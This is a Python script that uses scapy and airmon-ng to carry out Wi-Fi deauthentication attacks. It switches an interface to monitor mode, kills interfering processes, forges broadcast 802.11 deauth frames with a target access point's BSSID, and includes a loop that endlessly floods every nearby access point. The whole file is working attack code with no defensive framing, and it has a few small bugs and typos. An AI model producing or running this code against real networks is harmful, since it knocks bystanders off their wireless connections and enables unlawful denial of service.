import subprocess
from wifi_utils import *
import sys
from scapy.all import *


def prepare_attack(iface):
	monitor_mode(iface)
	kill_processes()


def send_AP_deauth(BSSID, iface):
	pkt = build_AP_deauth_pkt(BSSID)
	print("Seding deauth packet to %s" % (BSSID))
	sendp(pkt, iface=iface, verbose=False)


def deauth_AP(BSSID, iface):
	find_AP_channel(BSSID, iface)
	prepare_attack(iface)
	send_AP_deauth(BSSID, iface)


def deauth_all(use_aireplay, skip):
	interfaces = get_interfaces()
	iface = interfaces[0]  # we will use just one interface for now.
	APs = iwlist_scan(iface)
	prepare_attack(iface)
	while 1:
		for BSSID in APs:
			if BSSID in skip:
				continue
			set_channel(iface, APs[BSSID])
			send_AP_deauth(BSSID, iface)


def find_AP_channel(BSSID, iface):
    APs = iwlist_scan(iface)
    if BSSID not in APs:
        raise Exception("Access point not reachable.")
    channel = APs[BSSID]
    print("%s is on channel %d" % (BSSID, channel))
    return channel


def kill_processes():
    try:
        print("Killing processes that might interfer ...")
        subprocess.run(["airmon-ng", "check", "kill"], check=True)
    except subprocess.CalledProcessError:
        raise subprocess.CalledProcessError("Error killing processes.")


def build_AP_deauth_pkt(BSSID):
    return RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=BSSID, addr3=BSSID)/Dot11Deauth()


def build_client_deauth_pkt(client, BSSID):
    return RadioTap()/Dot11(addr1=BSSID, addr2=client, addr3=client)/Dot11Deauth()


# deauth_AP("66:D1:54:56:02:34", "wlan0")

# managed_mode(["wlan0"])
# run_NetworkManeger()
